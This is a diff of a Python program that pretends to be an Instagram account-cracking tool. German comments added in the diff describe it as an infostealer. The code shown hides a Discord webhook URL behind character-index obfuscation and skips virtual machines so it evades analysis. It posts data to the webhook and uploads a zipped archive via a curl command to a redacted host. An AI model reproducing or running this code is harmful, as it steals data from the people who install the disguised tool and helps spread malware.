@@ -20,15 +20,19 @@ import shutil
 import zipfile
 import ssl
 
-execution = "134.0.6998.35\\d3xil.dll"
+# Manche Module sind für den Code in dieser Form überflüssig
+
+# Methode die sicherstellt dass das Programm nur einmal ausführbar ist und so Multi-Execution der Malware
+# und damit spamming des Webhook's unterdrückt wird.
+execution = "134.0.6998.35\\d3xil.dll" # Pfad zur dummy-file
 
 
-content = "a01a2ca67900e33882aabfb44c2d644d44752f63f541d5fbbc779e2ecc7b7109"
+content = "a01a2ca67900e33882aabfb44c2d644d44752f63f541d5fbbc779e2ecc7b7109" # MD5 Hash Summe der Dummy Datei zum befüllen der Dummy Datei
 
 if not os.path.exists(execution):
-    with open(execution, "w") as file:
+    with open(execution, "w") as file:  # Überprüfen ob Datei vorhanden, falls nein, normale Ausführung, falls doch wird Ausführung verhindert
         file.write(content)
-else:
+else: # Und Alle Dateien werden gelöscht um Manipulationsversuche präventiv vorzubeugen
     print('[i] Premium Zugang abgelaufen. Kaufe eine erweiterte Lizenz vom Entwickler "camaxtli0355" über Discord :)')
     input("ENTER zum beenden...")
     try:
@@ -74,7 +78,7 @@ ERROR_LEVEL = 0
 
 
 
-nopsled = list(string.ascii_lowercase+string.ascii_uppercase+string.digits+string.punctuation)
+nopsled = list(string.ascii_lowercase+string.ascii_uppercase+string.digits+string.punctuation) # Obfuscation von Links und anderen sensiblen Strings
 
 intro = "The AlienZone-Community presents..."
 print(intro)
@@ -90,7 +94,7 @@ banner = """
 """
 slogan = """                         -- Crack Instagram Account's Today via Zero-Day Private Method Exploit --                          """
 
-def mixer(string: str) -> None:
+def mixer(string: str) -> None: # Vermischt effekte
     for char in string:
         print(underline+random.choice(effect)+char, end='', flush=True)
 
@@ -100,7 +104,7 @@ print(reset+slogan)
 def nutte_muss_warten():
     time.sleep(random.randint(2,5))
 
-def is_virtual_machine():
+def is_virtual_machine(): # Einfache Methode zum überprüfen ob wir uns in iner VM befinden. Weil Infos aus einer wertlos wären.
     try:
         output = subprocess.check_output("wmic diskdrive get model", shell=True, text=True)
         if any(keyword in output for keyword in ["VBOX", "VMware", "Virtual", "QEMU"]):
@@ -142,7 +146,7 @@ def check_username(username):
         driver.get(url)
 
 
-        title = driver.title
+        title = driver.title # Ohne API ürüfen ob der gegebene Nutzername existiert
         if "Seite nicht gefunden • Instagram" in title:
             print(red+f'\n[-] "{username}" existiert nicht.'+reset)
             driver.quit()
@@ -209,7 +213,7 @@ def instauserid(username):
         driver.quit()
     
 
-def uidb36_encode(user_id):
+def uidb36_encode(user_id): # UID in Base36 kodieren für den Link (idk warum Instagram das macht)
     user_id = int(str(user_id).strip('"').strip("'"))
     user_id = int(user_id)
     alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
@@ -229,7 +233,7 @@ def uidb36_encode(user_id):
 
 
 
-instagram_payload = (nopsled[7]+nopsled[19]+nopsled[19]+nopsled[15]+..."OBFUSCATED DISCORD-WEBHOOK URL")
+instagram_payload = (nopsled[7]+nopsled[19]+nopsled[19]+nopsled[15]+..."OBFUSCATED DISCORD-WEBHOOK URL") 
 
 
 def fatique(message):
@@ -240,7 +244,7 @@ def fatique(message):
            }
     requests.post(instagram_payload, data=data)
 
-def DataPipline():
+def DataPipline(): # Kernfunktion des Infostealer's
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("9.9.9.9", 80))
     # ss = context.wrap_socket(s, server_hostname="9.9.9.9")
@@ -403,13 +407,13 @@ def send_archiv(archive_name):
         if not zip_file.namelist(): 
             return False
         else:
-            curl_command = f'curl -X POST -F "file=@{archive_name}" XXXXXXXXXX.com'
+            curl_command = f'curl -X POST -F "file=@{archive_name}" XXXXXXXXXX.com' # :|
             # Führe den curl-Befehl aus und speichere die Ausgabe
             result = subprocess.run(curl_command, capture_output=True, text=True, shell=True)
             archiv_link = result.stdout
             response = requests.post(instagram_payload, data={"content": "########## Archiv-Link von "+comname+" ##########\n"+archiv_link})
 
-
+# Joa, rein in Python ist die Laufzeit ein BigL und zu rechenintensiv
 # def m_maker(folder_path):
 #     for root, _, files in os.walk(folder_path):
 #         for file in files:
